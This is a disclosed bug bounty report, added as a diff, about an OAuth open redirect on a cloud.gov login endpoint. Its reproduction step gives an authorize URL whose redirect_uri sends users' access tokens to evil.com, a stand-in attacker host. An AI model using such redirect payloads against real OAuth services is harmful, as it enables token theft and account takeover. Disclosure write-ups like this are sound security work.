@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/665651
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/manshum12
+ReportedTo:TTS Bug Bounty(tts)
+BountyAmount:750.0
+Severity:high
+State:Closed
+DateOfDisclosure:01.10.2019 18:25:11
+
+Summary:
+
+I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.
+
+Step : 
+1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
+
+2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .
+
+## Impact
+
+Attacker can using this bug to stolen victim access token , that means he can takeover victim account .
